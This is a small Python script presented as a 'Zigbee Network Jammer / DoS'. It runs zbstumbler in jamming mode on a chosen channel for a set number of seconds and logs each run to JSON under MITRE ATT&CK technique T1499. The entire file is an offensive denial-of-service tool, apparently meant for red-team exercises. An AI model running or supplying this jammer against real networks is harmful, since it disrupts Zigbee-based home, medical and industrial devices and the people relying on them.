#!/usr/bin/env python3

import subprocess
import argparse
import json
import os
import time
from datetime import datetime

LOG_FILE = "results/zigbee_dos_log.json"
MITRE_TTP = "T1499"

def log(entry):
    os.makedirs("results", exist_ok=True)
    try:
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    except:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def jam(channel=15, duration=30):
    cmd = f"zbstumbler -c {channel} --jam"
    proc = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE)
    time.sleep(duration)
    proc.terminate()

def main():
    parser = argparse.ArgumentParser(description="Zigbee Network Jammer / DoS")
    parser.add_argument("--channel", type=int, default=15, help="Zigbee channel")
    parser.add_argument("--duration", type=int, default=30, help="Duration in seconds")
    args = parser.parse_args()

    jam(args.channel, args.duration)
    log({
        "timestamp": datetime.utcnow().isoformat(),
        "channel": args.channel,
        "duration": args.duration,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
